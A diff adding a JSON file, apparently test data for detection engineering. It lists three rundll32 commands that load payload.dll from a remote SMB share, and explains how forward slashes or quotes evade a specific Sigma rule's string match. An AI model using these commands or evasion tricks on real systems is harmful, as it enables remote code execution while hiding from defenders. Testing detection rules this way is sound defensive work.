@@ -1,0 +1,14 @@
+[
+  {
+    "output": "rundll32.exe //192.168.1.1/share/payload.dll,EntryPoint",
+    "explanation": "Windows network path resolution often accepts forward slashes interchangeably with backslashes. Using forward slashes achieves the same execution but evades the backslash string matching completely."
+  },
+  {
+    "output": "rundll32.exe \"\\\\192.168.1.100\\share\\payload.dll\",EntryPoint",
+    "explanation": "The Sigma rule searches for a specific string pattern: a space followed by two backslashes (' \\\\'). By enclosing the UNC path in double quotes, the resulting command line creates the pattern (' \"\\\\'). This breaks the exact string match expected by the selection_cli condition while still executing properly."
+  },
+  {
+    "output": "rundll32.exe //192.168.1.100/share/payload.dll,EntryPoint",
+    "explanation": "Windows APIs natively normalize forward slashes to backslashes when resolving file and network paths. Using forward slashes ('//') completely removes the backslash characters from the command line execution telemetry, bypassing the rule's reliance on detecting '\\\\'."
+  }
+]
